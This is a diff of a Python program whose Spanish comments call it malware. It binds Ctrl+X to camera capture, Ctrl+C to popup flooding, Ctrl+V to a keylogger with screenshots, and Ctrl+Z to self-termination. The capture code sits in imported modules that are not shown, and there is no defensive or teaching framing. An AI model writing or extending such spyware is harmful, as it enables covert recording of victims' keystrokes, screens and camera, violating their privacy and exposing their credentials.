@@ -1,38 +1,37 @@
 from pynput.keyboard import Listener
 import os
 import threading
-from Classes import popup, logger, Background_Changer as bg
+from Classes import popup, logger, Background_Changer as bg, screenshots as ss, fotos as ft
 import schedule
+import subprocess
 
-def write_to_file(key):
-    letter = str(key)
-    letter = letter.replace("'", "")
+import keyboard
 
-    if letter == "Key.esc": # mata el proceso y cierra el malware
-        os.kill(os.getpid(), 9)
+def message(text):
+    print(text)
 
-    if letter == "\\x18": # CTRL + X
-        # agregar funcionalidad del malware
+def ctrlX(): #acceso a camara
+    threading.Thread(target=ft.camera).start()
+    # threading.Thread(target=message('x')).start()
 
-        pass 
+def ctrlC(): #mensajes en pantalla
+    p = popup.popupGenerator()
+    threading.Thread(target=p.start_popups(30)).start()
+    # threading.Thread(target=message('c')).start()
 
-    if letter == "\\x03": # CTRL + C
-        # agregar funcionalidad del malware
-        pp = popup.popupGenerator()
-        t1 = threading.Thread(target=pp.start_popups(30))
-        t2 = threading.Thread(target=pp.moveMouse)
-        t3 = threading.Thread(target=pp.closeWindows)
-        t1.start()
-        t2.start()
-        t3.start()
+def ctrlV(): #keylogger y screenshots
+    s = ss.ScreenShots()
+    l = logger.KeyLogger()
+    threading.Thread(target=l.start).start()
+    threading.Thread(target=s.Run).start()
+    # threading.Thread(target=message('v')).start()
+    
+def stop():
+    os.kill(os.getpid(), 9)
 
-    if letter == "\\x16": # CTRL + V
-        # agregar funcionalidad del malware
-        kl = logger.KeyLogger()
-        t4 = threading.Thread(target=kl.start())
-        t4.start()
+keyboard.add_hotkey('ctrl+x',ctrlX)
+keyboard.add_hotkey('ctrl+c',ctrlC)
+keyboard.add_hotkey('ctrl+v',ctrlV)
+keyboard.add_hotkey('ctrl+z',stop)
 
-schedule.every().day.at('15:07').do(bg.change_Wallpaper)
-with Listener(on_press=write_to_file) as ml:
-    ml.join()
-
+keyboard.wait()
